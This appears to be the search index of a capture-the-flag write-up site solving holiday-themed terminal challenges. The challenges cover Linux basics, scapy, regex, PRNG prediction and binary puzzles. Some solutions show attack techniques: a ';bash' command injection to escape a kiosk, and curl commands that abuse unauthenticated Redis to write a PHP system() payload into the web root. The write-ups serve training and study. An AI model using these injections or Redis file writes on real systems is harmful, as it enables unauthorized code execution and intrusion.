terminal, you'll have to escape the menu to a bash shell.","title":"Objective"},{"location":"Terminals/kiosk.html#analysis","text":"When you select option 4 to create your badge, it takes your name as user input and runs a Christmas-themed version of cowsay. Since cowsay is a command line program, you might be able to perform a command injection to start the bash shell. In a *nix shell, you can run two or more separate commands per line by separating them with semicolons.","title":"Analysis"},{"location":"Terminals/kiosk.html#solution","text":"Step 1: Select option 4 from the menu Step 2: Enter your name followed by \";bash\"","title":"Solution"},{"location":"Terminals/linuxprimer.html","text":"Linux Primer Objective Sugarplum Mary challenges you to complete the Linux Primer. You'll be asked to perform a task on the Linux command line. Enter the correct command to move on to the next task. Solution Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop! $ ls Now find the munchkin inside the munchkin. $ cat munchkin Great, now remove the munchkin in your home directory. $ rm munchkin_19315479765589239 Print the present working directory using a command. $ pwd Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin! $ ls -a Excellent, now find the munchkin in your command history. $ history | grep munchkin Find the munchkin in your environment variables. $ env | grep munchkin Next, head into the workshop. $ cd workshop A munchkin is hiding in one of the workshop toolboxes. Use \"grep\" while ignoring case to find which toolbox the munchkin is in. $ grep -i munchkin * A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin. $ chmod a+x lollipop_engine; ./lollipop_engine Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0. $ cd electrical/; mv blown_fuse0 fuse0 Now, make a symbolic link (symlink) named fuse1 that points to fuse0 $ ln -s fuse0 fuse1 Make a copy of fuse1 named fuse2. $ cp fuse1 fuse2 We need to make sure munchkins don't come back. Add the characters \"MUNCHKIN_REPELLENT\" into the file fuse2. $ echo MUNCHKIN_REPELLENT >> fuse2 Find the munchkin somewhere in /opt/munchkin_den. $ find /opt/munchkin_den -iname munchkin* Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin. $ find . -user munchkin Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/munchkin_den. $ find . -size +108k -size -110k List running processes to find another munchkin. $ ps -ef The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen. $ netstat -ntl The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last munchkin. $ curl http://127.0.0.1:54321 Your final task is to stop the 14516_munchkin process to collect the remaining lollipops. $ pkill 14516_munchkin","title":"Linux Primer"},{"location":"Terminals/linuxprimer.html#linux-primer","text":"","title":"Linux Primer"},{"location":"Terminals/linuxprimer.html#objective","text":"Sugarplum Mary challenges you to complete the Linux Primer. You'll be asked to perform a task on the Linux command line. Enter the correct command to move on to the next task.","title":"Objective"},{"location":"Terminals/linuxprimer.html#solution","text":"Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop! $ ls Now find the munchkin inside the munchkin. $ cat munchkin Great, now remove the munchkin in your home directory. $ rm munchkin_19315479765589239 Print the present working directory using a command. $ pwd Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin! $ ls -a Excellent, now find the munchkin in your command history. $ history | grep munchkin Find the munchkin in your environment variables. $ env | grep munchkin Next, head into the workshop. $ cd workshop A munchkin is hiding in one of the workshop toolboxes. Use \"grep\" while ignoring case to find which toolbox the munchkin is in. $ grep -i munchkin * A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin. $ chmod a+x lollipop_engine; ./lollipop_engine Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0. $ cd electrical/; mv blown_fuse0 fuse0 Now, make a symbolic link (symlink) named fuse1 that points to fuse0 $ ln -s fuse0 fuse1 Make a copy of fuse1 named fuse2. $ cp fuse1 fuse2 We need to make sure munchkins don't come back. Add the characters \"MUNCHKIN_REPELLENT\" into the file fuse2. $ echo MUNCHKIN_REPELLENT >> fuse2 Find the munchkin somewhere in /opt/munchkin_den. $ find /opt/munchkin_den -iname munchkin* Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin. $ find . -user munchkin Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/munchkin_den. $ find . -size +108k -size -110k List running processes to find another munchkin. $ ps -ef The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen. $ netstat -ntl The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last munchkin. $ curl http://127.0.0.1:54321 Your final task is to stop the 14516_munchkin process to collect the remaining lollipops. $ pkill 14516_munchkin","title":"Solution"},{"location":"Terminals/redis.html","text":"Redis Bug Hunt Objective Redis is an open source in-memory data store. In this terminal, Holly Evergreen needs some help finding the source code for the index page on the web server. Tip There are many sources on the Internet about pen-testing redis. This one was helpful in completing the terminal: https://book.hacktricks.xyz/pentesting/6379-pentesting-redis . Solution Redis contains functions for accessing the file system. The danger of allowing unauthenticated connections is that an attacker could read/write files on the server to run a command or even install a full featured web shell. $ curl http://localhost/maintenance.php?cmd=flushall $ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html $ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,redis.php $ curl http://localhost/maintenance.php?cmd=set,test,\\<?php+system\\(\\'cat+/var/www/html/index.php\\'\\)\\;?\\> $ curl http://localhost/maintenance.php?cmd=save $ curl --output - http://localhost/redis.php REDIS0009\ufffd redis-ver5.0.3\ufffd \ufffdedis-bits\ufffd@\ufffdctime\ufffd\ufffdk\ufffd_used-mem\u00b8 aof-preamble\ufffd\ufffd\ufffd test.<?php # We found the bug!! # # \\ / # .\\-/. # /\\ () () # \\/~---~\\.-~^-. # .-~^-./ | \\---. # { | } \\ # .-~\\ | /~-. # / \\ A / \\ # \\/ \\/","title":"Redis Bug Hunt"},{"location":"Terminals/redis.html#redis-bug-hunt","text":"","title":"Redis Bug Hunt"},{"location":"Terminals/redis.html#objective","text":"Redis is an open source in-memory data store. In this terminal, Holly Evergreen needs some help finding the source code for the index page on the web server. Tip There are many sources on the Internet about pen-testing redis. This one was helpful in completing the terminal: https://book.hacktricks.xyz/pentesting/6379-pentesting-redis .","title":"Objective"},{"location":"Terminals/redis.html#solution","text":"Redis contains functions for accessing the file system. The danger of allowing unauthenticated connections is that an attacker could read/write files on the server to run a command or even install a full featured web shell. $ curl http://localhost/maintenance.php?cmd=flushall $ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html $ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,redis.php $ curl http://localhost/maintenance.php?cmd=set,test,\\<?php+system\\(\\'cat+/var/www/html/index.php\\'\\)\\;?\\> $ curl http://localhost/maintenance.php?cmd=save $ curl --output - http://localhost/redis.php REDIS0009\ufffd redis-ver5.0.3\ufffd \ufffdedis-bits\ufffd@\ufffdctime\ufffd\ufffdk\ufffd_used-mem\u00b8 aof-preamble\ufffd\ufffd\ufffd test.<?php # We found the bug!! # # \\ / # .\\-/. # /\\ () () # \\/~---~\\.-~^-. # .-~^-./ | \\---. # { | } \\ # .-~\\ | /~-. # / \\ A / \\ # \\/ \\/","title":"Solution"},{"location":"Terminals/scapy.html","text":"Scapy Prepper Objective This terminal is a guided introduction to scapy, a network manipulation tool that can be used to capture, decode, and generate packets. It starts out spoon-feeding basic commands and usage to help you build familiarity with the tool, then asks questions that make you learn your way around the documentation. As the exercise progresses, the prompts become increasingly challenging. Tip Help completing this exercise can be found in the Scapy documentation at https://scapy.readthedocs.io/en/latest/ , or you can use a cheat sheet like this one: https://packetlife.net/media/library/36/scapy.pdf Solution Welcome to the \"Present Packet Prepper\" interface! The North Pole could use your help preparing present packets for shipment. Start by running the task.submit() function passing in a string argument of 'start'. Type task.help() for help on this question. >>> task.submit('start') Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted() Submit the class object of the scapy module that sends packets at layer 3 of the OSI model. For example, task.submit(sendp) would submit the sendp scapy class used to send packets at layer 2 of the OSI model. Scapy classes can be found at ( https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html ) >>> task.submit(send) Correct! The \"send\" scapy class will send a crafted scapy packet out of a network interface. Submit the class object of the scapy module that sniffs network packets and returns those packets in a list. >>> task.submit(sniff) Correct! the \"sniff\" scapy class will sniff network traffic and return these packets in a list. Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named \"pkt\": pkt = sr1(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sniff(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sendp(IP(dst=\"127.0.0.1\")/TCP(dport=20)) >>> task.submit(1) Correct! sr1 will send a packet, then immediately sniff for a response packet. Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets. >>> task.submit(rdpcap) Correct! the \"rdpcap\" scapy class can read pcap files. The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS: UDP_PACKETS.print() UDP_PACKETS.show() UDP_PACKETS.list() Try each option and see which one works. Submit the NUMBER only of the correct choice. >>> task.submit(2) Correct! .show() can be used on lists of packets AND on an individual packet. Submit only the first packet found in UDP_PACKETS. You can specify an item from a list using \"list_var_name[num]\" where \"num\" is the item number you want starting at 0. >>> task.submit(UDP_PACKETS[0]) Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0. Submit only the entire TCP layer of the second packet in TCP_PACKETS. If you had a packet stored in a variable named pkt, you could access its IP layer using \"pkt[IP]\" >>> task.submit(TCP_PACKETS[1][TCP]) Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP] Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet >>> UDP_PACKETS[0][IP].src=\"127.0.0.1\" >>> task.submit(UDP_PACKETS[0]) Correct! You can change ALL scapy packet attributes using this method. Submit the password \"task.submit('elf_password')\" of the user alabaster as found in the packet list TCP_PACKETS. >>> TCP_PACKETS[6][Raw].load b'PASS echo\\r\\n' >>> task.submit('echo') Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets: [pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt] The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. >>> task.submit(ICMP_PACKETS[1][ICMP].chksum) Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum . Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named \"pkt\" pkt = Ether(src='127.0.0.1')/ICMP(type=\"echo-request\") pkt = IP(src='127.0.0.1')/ICMP(type=\"echo-reply\") pkt = IP(dst='127.0.0.1')/ICMP(type=\"echo-request\") >>> task.submit(3) Correct! Once you assign the packet to a variable named \"pkt\" you can then use that variable to send or manipulate your created packet. Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified) >>> task.submit(IP(dst=\"127.127.127.127\")/UDP(dport=5000)) Correct! Your UDP packet creation should look something like this: pkt = IP(dst=\"127.127.127.127\")/UDP(dport=5000) task.submit(pkt) Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of \"elveslove.santa\". (all other packet attributes can be unspecified) >>> task.submit(IP(dst=\"127.2.3.4\")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='elveslove.santa'))) Correct! Your UDP packet creation should look something like this: pkt = IP(dst=\"127.2.3.4\")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=\"elveslove.santa\")) task.submit(pkt) The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection. >>> ARP_PACKETS[0][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=00:16:ce:6e:8b:24 psrc=192.168.0.114 hwdst=00:00:00:00:00:00 pdst=192.168.0.1 |> >>> ARP_PACKETS[1][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding load='\\xc0\\xa8\\x00r' |>> >>> ARP_PACKETS[1][ARP].op=2 >>> ARP_PACKETS[1][ARP].hwdst=\"00:16:ce:6e:8b:24\" >>> ARP_PACKETS[1] <Ether dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |<ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=00:e0:18:b1:0c:ad psrc=192.168.0.1 hwdst=00:16:ce:6e:8b:24 pdst=192.168.0.114 |<Padding load='\\xc0\\xa8\\x00r' |>>> >>> ARP_PACKETS[1][ARP].hwsrc='00:13:46:0b:22:ba' >>> task.submit(ARP_PACKETS) Great, you prepared all the present packets! Congratulations, all pretty present packets properly prepared for processing! Note In the last problem, you need to look at the Ethernet frame details in the full packet using ARP_PACKETS[1] to discover the proper source MAC address. Shell Escape You can escape to the terminal shell using os.system('/bin/bash')","title":"Scapy Prepper"},{"location":"Terminals/scapy.html#scapy-prepper","text":"","title":"Scapy Prepper"},{"location":"Terminals/scapy.html#objective","text":"This terminal is a guided introduction to scapy, a network manipulation tool that can be used to capture, decode, and generate packets. It starts out spoon-feeding basic commands and usage to help you build familiarity with the tool, then asks questions that make you learn your way around the documentation. As the exercise progresses, the prompts become increasingly challenging. Tip Help completing this exercise can be found in the Scapy documentation at https://scapy.readthedocs.io/en/latest/ , or you can use a cheat sheet like this one: https://packetlife.net/media/library/36/scapy.pdf","title":"Objective"},{"location":"Terminals/scapy.html#solution","text":"Welcome to the \"Present Packet Prepper\" interface! The North Pole could use your help preparing present packets for shipment. Start by running the task.submit() function passing in a string argument of 'start'. Type task.help() for help on this question. >>> task.submit('start') Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted() Submit the class object of the scapy module that sends packets at layer 3 of the OSI model. For example, task.submit(sendp) would submit the sendp scapy class used to send packets at layer 2 of the OSI model. Scapy classes can be found at ( https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html ) >>> task.submit(send) Correct! The \"send\" scapy class will send a crafted scapy packet out of a network interface. Submit the class object of the scapy module that sniffs network packets and returns those packets in a list. >>> task.submit(sniff) Correct! the \"sniff\" scapy class will sniff network traffic and return these packets in a list. Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named \"pkt\": pkt = sr1(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sniff(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sendp(IP(dst=\"127.0.0.1\")/TCP(dport=20)) >>> task.submit(1) Correct! sr1 will send a packet, then immediately sniff for a response packet. Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets. >>> task.submit(rdpcap) Correct! the \"rdpcap\" scapy class can read pcap files. The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS: UDP_PACKETS.print() UDP_PACKETS.show() UDP_PACKETS.list() Try each option and see which one works. Submit the NUMBER only of the correct choice. >>> task.submit(2) Correct! .show() can be used on lists of packets AND on an individual packet. Submit only the first packet found in UDP_PACKETS. You can specify an item from a list using \"list_var_name[num]\" where \"num\" is the item number you want starting at 0. >>> task.submit(UDP_PACKETS[0]) Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0. Submit only the entire TCP layer of the second packet in TCP_PACKETS. If you had a packet stored in a variable named pkt, you could access its IP layer using \"pkt[IP]\" >>> task.submit(TCP_PACKETS[1][TCP]) Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP] Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet >>> UDP_PACKETS[0][IP].src=\"127.0.0.1\" >>> task.submit(UDP_PACKETS[0]) Correct! You can change ALL scapy packet attributes using this method. Submit the password \"task.submit('elf_password')\" of the user alabaster as found in the packet list TCP_PACKETS. >>> TCP_PACKETS[6][Raw].load b'PASS echo\\r\\n' >>> task.submit('echo') Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets: [pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt] The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. >>> task.submit(ICMP_PACKETS[1][ICMP].chksum) Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum . Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named \"pkt\" pkt = Ether(src='127.0.0.1')/ICMP(type=\"echo-request\") pkt = IP(src='127.0.0.1')/ICMP(type=\"echo-reply\") pkt = IP(dst='127.0.0.1')/ICMP(type=\"echo-request\") >>> task.submit(3) Correct! Once you assign the packet to a variable named \"pkt\" you can then use that variable to send or manipulate your created packet. Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified) >>> task.submit(IP(dst=\"127.127.127.127\")/UDP(dport=5000)) Correct! Your UDP packet creation should look something like this: pkt = IP(dst=\"127.127.127.127\")/UDP(dport=5000) task.submit(pkt) Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of \"elveslove.santa\". (all other packet attributes can be unspecified) >>> task.submit(IP(dst=\"127.2.3.4\")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='elveslove.santa'))) Correct! Your UDP packet creation should look something like this: pkt = IP(dst=\"127.2.3.4\")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=\"elveslove.santa\")) task.submit(pkt) The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection. >>> ARP_PACKETS[0][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=00:16:ce:6e:8b:24 psrc=192.168.0.114 hwdst=00:00:00:00:00:00 pdst=192.168.0.1 |> >>> ARP_PACKETS[1][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding load='\\xc0\\xa8\\x00r' |>> >>> ARP_PACKETS[1][ARP].op=2 >>> ARP_PACKETS[1][ARP].hwdst=\"00:16:ce:6e:8b:24\" >>> ARP_PACKETS[1] <Ether dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |<ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=00:e0:18:b1:0c:ad psrc=192.168.0.1 hwdst=00:16:ce:6e:8b:24 pdst=192.168.0.114 |<Padding load='\\xc0\\xa8\\x00r' |>>> >>> ARP_PACKETS[1][ARP].hwsrc='00:13:46:0b:22:ba' >>> task.submit(ARP_PACKETS) Great, you prepared all the present packets! Congratulations, all pretty present packets properly prepared for processing! Note In the last problem, you need to look at the Ethernet frame details in the full packet using ARP_PACKETS[1] to discover the proper source MAC address.","title":"Solution"},{"location":"Terminals/scapy.html#shell-escape","text":"You can escape to the terminal shell using os.system('/bin/bash')","title":"Shell Escape"},{"location":"Terminals/snowball.html","text":"Snowball Fight Objective Win Snowball Fight on the \"Impossible\" difficulty level. Analysis Snowball Fight is a variation on the classic game Battleship, but played with snow forts instead of naval ships. The board layout is generated by the computer based on a 32-bit seed value, such that any given layout can be repeated by using the same seed value. The initial seed is randomly generated, but can be overridden by the user in the Easy level. The user can win repeatedly by playing with the same seed value over and over. The seed cannot be specified by the user in the Hard level, however the user can cheat by copying the displayed seed value into an Easy game to determine the snow fort positions, then use that information to win the Hard game. On the Impossible level, the seed value cannot be overridden or found anywhere on the screen. If you look at the page source, however, you'll find 624 randomly generated numbers in the comments that were discarded by the computer before selecting one as the seed for that game. The premise behind this terminal is that while pseudo-random number generators (PRNG) can produce a statistically sound series of random numbers, they are highly predictable under certain circumstances. In the case of MT19937, the most widely used PRNG, you can predict the numbers it will select if you know 624 of the most recently generated numbers. Tip Watch Tom Liston's talk about Mersenne Twisters for background on this topic. Solution #!/usr/bin/env python3 # Requires mt19937.py from https://github.com/tliston/mt19937 import mt19937 import random import re if __name__ == \"__main__\" : # create an instance of mt19937 with seed 0 myprng = mt19937 . mt19937 ( 0 ) # load the known random numbers as an array f = open ( \"numbers.txt\" , \"r\" ) content = f . read () regex = r \"(\\d{6,10})\" randnums = re . findall ( regex , content ) # Untemper the random numbers and store them in the MT array for i in range ( len ( randnums )): myprng . MT [ i ] = mt19937 . untemper ( int ( randnums [ i ])) # Create some additional random numbers print ( \"Now, predict the next random numbers...\" ) for i in range ( 5 ): r2 = myprng . extract_number () print ( \" %i : %10.10i \" % ( i , r2 )) Step 1: Start the Snowball Fight game in Impossible mode and copy the page source code including all of the discarded random numbers into a file numbers.txt. Step 2: Run the program and obtain the predicted next random number. $ ./predict.py Now, predict the next random numbers... 0: 3181216032 1: 3149432775 2: 2425293170 3: 0659190009 4: 1200190550 5: 2700544682 Step 3: Open another instance of Snowball Fight and play the game in Easy Mode using the predicted random number. Record all of the positions where you made a hit. Step 4: Return to the Snowball Fight game that's in Impossible mode and play it using the positions you recorded from the Easy game.","title":"Snowball Fight"},{"location":"Terminals/snowball.html#snowball-fight","text":"","title":"Snowball Fight"},{"location":"Terminals/snowball.html#objective","text":"Win Snowball Fight on the \"Impossible\" difficulty level.","title":"Objective"},{"location":"Terminals/snowball.html#analysis","text":"Snowball Fight is a variation on the classic game Battleship, but played with snow forts instead of naval ships. The board layout is generated by the computer based on a 32-bit seed value, such that any given layout can be repeated by using the same seed value. The initial seed is randomly generated, but can be overridden by the user in the Easy level. The user can win repeatedly by playing with the same seed value over and over. The seed cannot be specified by the user in the Hard level, however the user can cheat by copying the displayed seed value into an Easy game to determine the snow fort positions, then use that information to win the Hard game. On the Impossible level, the seed value cannot be overridden or found anywhere on the screen. If you look at the page source, however, you'll find 624 randomly generated numbers in the comments that were discarded by the computer before selecting one as the seed for that game. The premise behind this terminal is that while pseudo-random number generators (PRNG) can produce a statistically sound series of random numbers, they are highly predictable under certain circumstances. In the case of MT19937, the most widely used PRNG, you can predict the numbers it will select if you know 624 of the most recently generated numbers. Tip Watch Tom Liston's talk about Mersenne Twisters for background on this topic.","title":"Analysis"},{"location":"Terminals/snowball.html#solution","text":"#!/usr/bin/env python3 # Requires mt19937.py from https://github.com/tliston/mt19937 import mt19937 import random import re if __name__ == \"__main__\" : # create an instance of mt19937 with seed 0 myprng = mt19937 . mt19937 ( 0 ) # load the known random numbers as an array f = open ( \"numbers.txt\" , \"r\" ) content = f . read () regex = r \"(\\d{6,10})\" randnums = re . findall ( regex , content ) # Untemper the random numbers and store them in the MT array for i in range ( len ( randnums )): myprng . MT [ i ] = mt19937 . untemper ( int ( randnums [ i ])) # Create some additional random numbers print ( \"Now, predict the next random numbers...\" ) for i in range ( 5 ): r2 = myprng . extract_number () print ( \" %i : %10.10i \" % ( i , r2 )) Step 1: Start the Snowball Fight game in Impossible mode and copy the page source code including all of the discarded random numbers into a file numbers.txt. Step 2: Run the program and obtain the predicted next random number. $ ./predict.py Now, predict the next random numbers... 0: 3181216032 1: 3149432775 2: 2425293170 3: 0659190009 4: 1200190550 5: 2700544682 Step 3: Open another instance of Snowball Fight and play the game in Easy Mode using the predicted random number. Record all of the positions where you made a hit. Step 4: Return to the Snowball Fight game that's in Impossible mode and play it using the positions you recorded from the Easy game.","title":"Solution"},{"location":"Terminals/sortomatic.html","text":"Sort-o-matic Objective Minty Candycane wants help fixing the sortomatic. Create regex patterns to match the strings that the Sort-o-matic requires. Tip Writing regex patterns is easier when you use a regex tester/debugger like RegEx101 . Solution 1) Matches at least one digit \\d+ 2) Matches 3 alpha a-z characters ignoring case [A-Za-z]{3} 3) Matches 2 chars of lowercase a-z or numbers [a-z0-9]{2} 4) Matches any 2 chars not uppercase A-L or 1-5 [^A-L1-5]{2} 5) Matches three or more digits only ^\\d{3,}$ 6) Matches multiple hour:minute:second time formats only ^(\\d|[0-1]\\d|2[0-3]):([0-5][0-9]):([0-5][0-9])$ 7) Matches MAC address format only while ignoring case ^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$ 8) Matches multiple day, month, and year date formats only ^(0[1-9]|[1-2]\\d|3[0-1])[-\\/.](0[1-9]|1[0-2])[-\\/.](19|20)\\d\\d$","title":"Sort-o-matic"},{"location":"Terminals/sortomatic.html#sort-o-matic","text":"","title":"Sort-o-matic"},{"location":"Terminals/sortomatic.html#objective","text":"Minty Candycane wants help fixing the sortomatic. Create regex patterns to match the strings that the Sort-o-matic requires. Tip Writing regex patterns is easier when you use a regex tester/debugger like RegEx101 .","title":"Objective"},{"location":"Terminals/sortomatic.html#solution","text":"1) Matches at least one digit \\d+ 2) Matches 3 alpha a-z characters ignoring case [A-Za-z]{3} 3) Matches 2 chars of lowercase a-z or numbers [a-z0-9]{2} 4) Matches any 2 chars not uppercase A-L or 1-5 [^A-L1-5]{2} 5) Matches three or more digits only ^\\d{3,}$ 6) Matches multiple hour:minute:second time formats only ^(\\d|[0-1]\\d|2[0-3]):([0-5][0-9]):([0-5][0-9])$ 7) Matches MAC address format only while ignoring case ^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$ 8) Matches multiple day, month, and year date formats only ^(0[1-9]|[1-2]\\d|3[0-1])[-\\/.](0[1-9]|1[0-2])[-\\/.](19|20)\\d\\d$","title":"Solution"},{"location":"Terminals/unescapetmux.html","text":"Unescape Tmux Objective Tmux is short for Terminal Multiplexer. It's an open source tool that allows you to display more than one shell on a single text based terminal. It also allows you to detach a session so that it keeps running while you're logged out, and can be reattached when you sign back in. Pepper Minstix needs some help remembering how to resume a session. Tip Visit tmuxcheatsheet.com for a quick reference of common tmux commands. Solution elf@0bc3b54183db:~$ tmux list-session 0: 1 windows (created Wed Dec 30 20:58:38 2020) [80x24] elf@0bc3b54183db:~$ tmux attach -t 0","title":"Unescape Tmux"},{"location":"Terminals/unescapetmux.html#unescape-tmux","text":"","title":"Unescape Tmux"},{"location":"Terminals/unescapetmux.html#objective","text":"Tmux is short for Terminal Multiplexer. It's an open source tool that allows you to display more than one shell on a single text based terminal. It also allows you to detach a session so that it keeps running while you're logged out, and can be reattached when you sign back in. Pepper Minstix needs some help remembering how to resume a session. Tip Visit tmuxcheatsheet.com for a quick reference of common tmux commands.","title":"Objective"},{"location":"Terminals/unescapetmux.html#solution","text":"elf@0bc3b54183db:~$ tmux list-session 0: 1 windows (created Wed Dec 30 20:58:38 2020) [80x24] elf@0bc3b54183db:~$ tmux attach -t 0","title":"Solution"},{"location":"Terminals/unprep.html","text":"Speaker UNprep Objective There are three challenges in this terminal that will: open the Speaker UnPrep room door, turn on the lights, and turn on a vending machine. A lab folder is provided so you can experiment with writable copies of the commands and their configuration files. Open the door This terminal challenge offers to open the door to the Speaker Unpreparedness Room by providing a password to the door program. Since door is an elf binary executable, you can examine the text strings inside of it to find the password. $ file door door: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4973fb994a1038936fd6111fa1e01d95f052a1dd, stripped $ strings door | grep pass /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a Be sure to finish the challenge in prod: And don't forget, the password is \"Op3nTheD00r\" Beep boop invalid password $ ./door You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter? > Op3nTheD00r Checking...... Door opened! Turn on the lights The lights program provides a hint that it decrypts the conf file at runtime. By modifying the lights.conf file and replacing the username with the encrypted password string, the program will provide the unencrypted password at start-up. $ sed -i 's/elf-technician/E$ed633d885dcb9b2f3f0118361de4d57752712 c27c5316a95d9e5e5b124/' lights.conf $ ./lights <...output omitted...> The terminal just blinks: Welcome back, Computer-TurnLightsOn Turn on the vending machine The vending-machines program provides a hint that it behaves differently if its configuration file cannot be found. When you delete the vending-machines.json file and run the program, you're allowed to supply your own username and password, which produces a new json file with an encrypted password. $ rm vending-machines.json $ ./vending-machines <..output omitted..> ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated! Please enter the name > foo Please enter the password > AAAAAAAAAAAAAAAA <..output omitted..> $ cat vending-machines.json { \"name\": \"foo\", \"password\": \"XiGRehmwXiGRehmw\" } Through the process of cryptanalysis, you may be able to determine what encryption is used, and ultimately decrypt the original password. Since you have control over the encryption program and can compare plaintext inputs you choose with the resulting encrypted ciphertext, the technique is known as a chosen plaintext attack. Start by supplying the program with a long string of A's, and observe that the program encrypts it into the ciphertext \"XiGRehmwXiGRehmw\". If this were a simple substitution cipher, the letter A would always be replaced with the letter X, however that is not the case here. This ciphertext repeats itself every 8th character, which suggests a polyalphabetic substitution cipher, meaning there are multiple substitutions. To figure this out, remove the vending_machines.json file again and run the vending-machines program to set a password containing 8 of every character a-z, A-z, and 0-9. The program generates the following new vending-machines.json file: $ cat vending-machines.json { \"name\": \"q\", \"password\": 